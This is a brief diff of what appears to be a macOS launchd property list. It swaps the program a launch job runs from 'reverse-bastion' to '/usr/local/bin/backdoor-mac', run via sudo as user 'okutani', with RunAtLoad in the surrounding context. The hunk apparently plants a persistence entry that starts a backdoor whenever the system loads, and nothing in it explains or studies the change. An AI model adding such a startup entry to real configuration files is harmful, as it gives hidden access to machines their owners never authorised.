@@ -7,7 +7,10 @@
 
     <key>ProgramArguments</key>
     <array>
-      <string>/usr/local/bin/reverse-bastion</string>
+      <string>sudo</string>
+      <string>-u</string>
+      <string>okutani</string>
+      <string>/usr/local/bin/backdoor-mac</string>
     </array>
 
     <key>RunAtLoad</key>
